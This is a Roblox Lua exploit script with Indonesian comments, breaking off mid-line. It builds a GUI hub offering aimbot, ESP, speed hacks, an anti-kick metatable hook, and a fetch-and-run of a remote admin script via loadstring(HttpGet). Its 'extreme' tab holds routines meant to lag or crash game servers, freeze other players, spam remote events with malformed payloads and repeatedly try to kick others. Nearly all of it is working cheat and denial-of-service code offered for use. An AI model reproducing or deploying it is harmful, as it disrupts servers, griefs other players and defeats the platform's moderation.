--[[
    UNIVERSAL HUB - EXTREME EDITION
    - UI kecil & ramah (warna soft)
    - Semua fitur pakai toggle ON/OFF
    - Bisa di-drag (geser)
    - ESP fully functional
    - Mobile friendly
    - EXTREME FEATURES (Lag Server, Crash, dll)
]]

-- Hapus GUI lama
if game.CoreGui:FindFirstChild("UniversalHub") then
    game.CoreGui.UniversalHub:Destroy()
end

-- Buat ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "UniversalHub"
screenGui.Parent = game.CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- Variables global untuk fitur
local Features = {
    SpeedBoost = false,
    JumpPower = false,
    InfiniteYield = false,
    Aimbot = false,
    ESP = false,
    Wallhack = false,
    NoClip = false,
    Fly = false,
    -- EXTREME FEATURES
    LagServer = false,
    CrashServer = false,
    FreezeAll = false,
    SpamBalls = false,
    LoopKick = false,
    AntiBan = false,
    ServerHop = false,
    CorruptServer = false
}

-- Anti Ban (sederhana)
local function toggleAntiBan(state)
    if state then
        -- Anti-log
        local mt = getrawmetatable(game)
        local old = mt.__namecall
        setreadonly(mt, false)
        mt.__namecall = newcclosure(function(...)
            local args = {...}
            local method = getnamecallmethod()
            if method == "Kick" or method == "kick" then
                return wait(9e9)
            end
            return old(...)
        end)
        setreadonly(mt, true)
    end
end

-- Fungsi ESP
local function toggleESP(state)
    if state then
        -- ESP ON
        for _, v in pairs(game.Players:GetPlayers()) do
            if v ~= game.Players.LocalPlayer then
                local highlight = Instance.new("Highlight")
                highlight.Name = "ESP_Highlight"
                highlight.FillColor = Color3.fromRGB(255, 50, 50)
                highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                highlight.FillTransparency = 0.5
                highlight.Parent = v.Character or v.CharacterAdded:Wait()
                
                v.CharacterAdded:Connect(function(char)
                    wait(0.5)
                    local newHighlight = Instance.new("Highlight")
                    newHighlight.Name = "ESP_Highlight"
                    newHighlight.FillColor = Color3.fromRGB(255, 50, 50)
                    newHighlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                    newHighlight.FillTransparency = 0.5
                    newHighlight.Parent = char
                end)
            end
        end
        
        game.Players.PlayerAdded:Connect(function(player)
            player.CharacterAdded:Connect(function(char)
                wait(0.5)
                if Features.ESP then
                    local highlight = Instance.new("Highlight")
                    highlight.Name = "ESP_Highlight"
                    highlight.FillColor = Color3.fromRGB(255, 50, 50)
                    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
                    highlight.FillTransparency = 0.5
                    highlight.Parent = char
                end
            end)
        end)
    else
        -- ESP OFF
        for _, v in pairs(game.Players:GetPlayers()) do
            if v.Character then
                local highlight = v.Character:FindFirstChild("ESP_Highlight")
                if highlight then
                    highlight:Destroy()
                end
            end
        end
    end
end

-- Fungsi Infinite Yield
local function toggleInfiniteYield(state)
    if state then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end
end

-- Fungsi Speed Boost
local function toggleSpeedBoost(state)
    local player = game.Players.LocalPlayer
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        if state then
            player.Character.Humanoid.WalkSpeed = 50
        else
            player.Character.Humanoid.WalkSpeed = 16
        end
    end
end

-- Fungsi Jump Power
local function toggleJumpPower(state)
    local player = game.Players.LocalPlayer
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        if state then
            player.Character.Humanoid.JumpPower = 100
        else
            player.Character.Humanoid.JumpPower = 50
        end
    end
end

-- Fungsi Aimbot
local function toggleAimbot(state)
    Features.Aimbot = state
    if state then
        local RunService = game:GetService("RunService")
        RunService.RenderStepped:Connect(function()
            if Features.Aimbot then
                local closestPlayer = nil
                local closestDistance = math.huge
                local mouse = game.Players.LocalPlayer:GetMouse()
                
                for _, v in pairs(game.Players:GetPlayers()) do
                    if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Head") then
                        local distance = (v.Character.Head.Position - game.Players.LocalPlayer.Character.Head.Position).Magnitude
                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = v
                        end
                    end
                end
                
                if closestPlayer and closestPlayer.Character and closestPlayer.Character:FindFirstChild("Head") then
                    workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, closestPlayer.Character.Head.Position)
                end
            end
        end)
    end
end

-- =============================================
-- EXTREME FEATURES
-- =============================================

-- 1. LAG SERVER - Bikin server lemot
local function toggleLagServer(state)
    Features.LagServer = state
    if state then
        -- Method 1: Spawn banyak part
        spawn(function()
            while Features.LagServer do
                for i = 1, 100 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(100, 100, 100)
                    part.Position = Vector3.new(math.random(-1000, 1000), math.random(0, 500), math.random(-1000, 1000))
                    part.Anchored = true
                    part.CanCollide = false
                    part.Transparency = 1
                    part.Parent = workspace
                    game:GetService("Debris"):AddItem(part, 0.1)
                end
                wait()
            end
        end)
        
        -- Method 2: Loop Remote event
        spawn(function()
            while Features.LagServer do
                for _, v in pairs(game:GetDescendants()) do
                    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
                        pcall(function()
                            v:FireServer({})
                        end)
                    end
                end
                wait()
            end
        end)
        
        -- Method 3: Physics spam
        spawn(function()
            while Features.LagServer do
                for i = 1, 50 do
                    local ball = Instance.new("Part")
                    ball.Shape = Enum.PartType.Ball
                    ball.Size = Vector3.new(5, 5, 5)
                    ball.Position = game.Players.LocalPlayer.Character.Head.Position + Vector3.new(math.random(-50, 50), math.random(0, 20), math.random(-50, 50))
                    ball.Velocity = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
                    ball.Parent = workspace
                    game:GetService("Debris"):AddItem(ball, 2)
                end
                wait(0.1)
            end
        end)
    end
end

-- 2. CRASH SERVER - Bikin server crash
local function toggleCrashServer(state)
    Features.CrashServer = state
    if state then
        -- Method extreme: Loop infinite instances
        spawn(function()
            while Features.CrashServer do
                for i = 1, 1000 do
                    local p = Instance.new("Part")
                    p.Parent = workspace
                    p:Destroy()
                end
                wait()
            end
        end)
        
        -- Method 2: Memory leak
        spawn(function()
            local tbl = {}
            while Features.CrashServer do
                for i = 1, 10000 do
                    table.insert(tbl, {i, "data", game, workspace, players})
                end
                wait()
            end
        end)
    end
end

-- 3. FREEZE ALL PLAYERS
local function toggleFreezeAll(state)
    Features.FreezeAll = state
    if state then
        spawn(function()
            while Features.FreezeAll do
                for _, v in pairs(game.Players:GetPlayers()) do
                    if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                        v.Character.HumanoidRootPart.Anchored = true
                    end
                end
                wait(0.1)
            end
        end)
    else
        for _, v in pairs(game.Players:GetPlayers()) do
            if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                v.Character.HumanoidRootPart.Anchored = false
            end
        end
    end
end

-- 4. SPAM BALLS
local function toggleSpamBalls(state)
    Features.SpamBalls = state
    if state then
        spawn(function()
            while Features.SpamBalls do
                for i = 1, 30 do
                    local ball = Instance.new("Part")
                    ball.Shape = Enum.PartType.Ball
                    ball.Size = Vector3.new(3, 3, 3)
                    ball.BrickColor = BrickColor.Random()
                    ball.Material = Enum.Material.Neon
                    ball.Position = game.Players.LocalPlayer.Character.Head.Position + Vector3.new(math.random(-20, 20), math.random(0, 10), math.random(-20, 20))
                    ball.Velocity = Vector3.new(math.random(-300, 300), math.random(100, 300), math.random(-300, 300))
                    ball.Parent = workspace
                    game:GetService("Debris"):AddItem(ball, 3)
                end
                wait(0.2)
            end
        end)
    end
end

-- 5. LOOP KICK (coba kick semua player)
local function toggleLoopKick(state)
    Features.LoopKick = state
    if state then
        spawn(function()
            while Features.LoopKick do
                for _, v in pairs(game.Players:GetPlayers()) do
                    if v ~= game.Players.LocalPlayer then
                        pcall(function()
                            v:Kick("EKSPERIMEN")
                        end)
                    end
                end
                wait(1)
            end
        end)
    end
end

-- 6. SERVER HOP OTOMATIS
local function toggleServerHop(state)
    Features.ServerHop = state
    if state then
        spawn(function()
            while Features.ServerHop do
                wait(30) -- Ganti server tiap 30 detik
                local placeId = game.PlaceId
                local x = {}
                for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?limit=100")).data) do
                    if v.playing < v.maxPlayers and v.id ~= game.JobId then
                        table.insert(x, v.id)
                    end
                end
                if #x > 0 then
                    game:GetService("TeleportService"):TeleportToPlaceInstance(placeId, x[math.random(1, #x)], game.Players.LocalPlayer)
                end
            end
        end)
    end
end

-- 7. CORRUPT SERVER (Remotefire spam)
local function toggleCorruptServer(state)
    Features.CorruptServer = state
    if state then
        spawn(function()
            while Features.CorruptServer do
                for _, v in pairs(game:GetDescendants()) do
                    if v:IsA("RemoteEvent") then
                        pcall(function()
                            v:FireServer({math.huge, nil, "data", workspace})
                        end)
                    end
                    if v:IsA("RemoteFunction") then
                        pcall(function()
                            v:InvokeServer({math.huge, nil, "crash"})
                        end)
                    end
                end
                wait()
            end
        end)
    end
end

-- UI Compact
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 350, 0, 500) -- Lebih besar dikit buat fitur extreme
mainFrame.Position = UDim2.new(0.5, -175, 0.5, -250)
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
mainFrame.BackgroundTransparency = 0.1
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

-- Background blur soft
mainFrame.BackgroundColor3 = Color3.fromRGB(245, 245, 255)
mainFrame.BackgroundTransparency = 0.15

-- Shadow
local shadow = Instance.new("ImageLabel")
shadow.Size = UDim2.new(1, 20, 1, 20)
shadow.Position = UDim2.new(0, -10, 0, -10)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://1316045217"
shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
shadow.ImageTransparency = 0.7
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(10, 10, 118, 118)
shadow.Parent = mainFrame
shadow.ZIndex = -1

-- Rounded corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 20)
corner.Parent = mainFrame

-- Stroke tipis
local stroke = Instance.new("UIStroke")
stroke.Thickness = 1
stroke.Color = Color3.fromRGB(200, 200, 255)
stroke.Transparency = 0.3
stroke.Parent = mainFrame

-- Title Bar
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 45)
titleBar.BackgroundColor3 = Color3.fromRGB(235, 235, 255)
titleBar.BackgroundTransparency = 0.2
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 20)
titleCorner.Parent = titleBar

-- Icon
local icon = Instance.new("TextLabel")
icon.Size = UDim2.new(0, 30, 0, 30)
icon.Position = UDim2.new(0, 10, 0.5, -15)
icon.BackgroundTransparency = 1
icon.Text = "💀"
icon.TextSize = 20
icon.TextColor3 = Color3.fromRGB(255, 100, 100)
icon.Font = Enum.Font.SourceSans
icon.Parent = titleBar

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -80, 1, 0)
title.Position = UDim2.new(0, 45, 0, 0)
title.BackgroundTransparency = 1
title.Text = "EXTREME HUB"
title.TextColor3 = Color3.fromRGB(80, 80, 120)
title.TextSize = 16
title.TextXAlignment = Enum.TextXAlignment.Left
title.Font = Enum.Font.GothamBold
title.Parent = titleBar

-- Close Button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -40, 0.5, -15)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 180, 180)
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextSize = 18
closeBtn.Font = Enum.Font.GothamBold
closeBtn.BorderSizePixel = 0
closeBtn.Parent = titleBar

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 10)
closeCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Tab Container
local tabContainer = Instance.new("Frame")
tabContainer.Size = UDim2.new(1, -20, 0, 40)
tabContainer.Position = UDim2.new(0, 10, 0, 50)
tabContainer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
tabContainer.BackgroundTransparency = 0.5
tabContainer.BorderSizePixel = 0
tabContainer.Parent = mainFrame

local tabCorner = Instance.new("UICorner")
tabCorner.CornerRadius = UDim.new(0, 12)
tabCorner.Parent = tabContainer

-- Tabs
local tabs = {"MAIN", "COMBAT", "EXTREME", "SET"}
local tabButtons = {}
local currentTab = "MAIN"

for i, tabName in ipairs(tabs) do
    local tabBtn = Instance.new("TextButton")
    tabBtn.Size = UDim2.new(0.25, -2, 0, 30)
    tabBtn.Position = UDim2.new((i-1) * 0.25, 5, 0.5, -15)
    tabBtn.BackgroundColor3 = tabName == currentTab and Color3.fromRGB(150, 150, 255) or Color3.fromRGB(220, 220, 240)
    tabBtn.Text = tabName
    tabBtn.TextColor3 = tabName == currentTab and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(100, 100, 150)
    tabBtn.TextSize = 12
    tabBtn.Font = Enum.Font.GothamBold
    tabBtn.BorderSizePixel = 0
    tabBtn.Parent = tabContainer
    
    local tabBtnCorner = Instance.new("UICorner")
    tabBtnCorner.CornerRadius = UDim.new(0, 10)
    tabBtnCorner.Parent = tabBtn
    
    tabBtn.MouseButton1Click:Connect(function()
        for _, btn in ipairs(tabButtons) do
            btn.BackgroundColor3 = Color3.fromRGB(220, 220, 240)
            btn.TextColor3 = Color3.fromRGB(100, 100, 150)
        end
        tabBtn.BackgroundColor3 = Color3.fromRGB(150, 150, 255)
        tabBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        currentTab = tabName
        
        -- Clear content
        if contentFrame then
            for _, child in ipairs(contentFrame:GetChildren()) do
                if not child:IsA("UIListLayout") then
                    child:Destroy()
                end
            end
            LoadTabContent(currentTab)
        end
    end)
    
    table.insert(tabButtons, tabBtn)
end

-- Content Frame (Scrolling)
local contentFrame = Instance.new("ScrollingFrame")
contentFrame.Name = "Content"
contentFrame.Size = UDim2.new(1, -20, 1, -110)
contentFrame.Position = UDim2.new(0, 10, 0, 95)
contentFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
contentFrame.BackgroundTransparency = 0.8
contentFrame.BorderSizePixel = 0
contentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
contentFrame.ScrollBarThickness = 4
contentFrame.ScrollBarImageColor3 = Color3.fromRGB(150, 150, 255)
contentFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
contentFrame.Parent = mainFrame

local contentCorner = Instance.new("UICorner")
contentCorner.CornerRadius = UDim.new(0, 15)
contentCorner.Parent = contentFrame

local contentLayout = Instance.new("UIListLayout")
contentLayout.Padding = UDim.new(0, 8)
contentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
contentLayout.Parent = contentFrame

local contentPadding = Instance.new("UIPadding")
contentPadding.PaddingTop = UDim.new(0, 10)
contentPadding.PaddingBottom = UDim.new(0, 10)
contentPadding.Parent = contentFrame

-- Function to create toggle items
function CreateToggle(parent, icon, title, default, callback, order, warning)
    local toggleFrame = Instance.new("Frame")
    toggleFrame.Size = UDim2.new(1, -20, 0, 45)
    toggleFrame.BackgroundColor3 = warning and Color3.fromRGB(255, 240, 240) or Color3.fromRGB(255, 255, 255)
    toggleFrame.BackgroundTransparency = 0.5
    toggleFrame.BorderSizePixel = 0
    toggleFrame.LayoutOrder = order
    toggleFrame.Parent = parent
    
    local toggleCorner = Instance.new("UICorner")
    toggleCorner.CornerRadius = UDim.new(0, 12)
    toggleCorner.Parent = toggleFrame
    
    -- Icon
    local iconLabel = Instance.new("TextLabel")
    iconLabel.Size = UDim2.new(0, 30, 0, 30)
    iconLabel.Position = UDim2.new(0, 8, 0.5, -15)
    iconLabel.BackgroundTransparency = 1
    iconLabel.Text = icon
    iconLabel.TextSize = 18
    iconLabel.Font = Enum.Font.SourceSans
    iconLabel.Parent = toggleFrame
    
    -- Title
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(0.5, -40, 1, 0)
    titleLabel.Position = UDim2.new(0, 40, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = title
    titleLabel.TextColor3 = warning and Color3.fromRGB(200, 80, 80) or Color3.fromRGB(80, 80, 120)
    titleLabe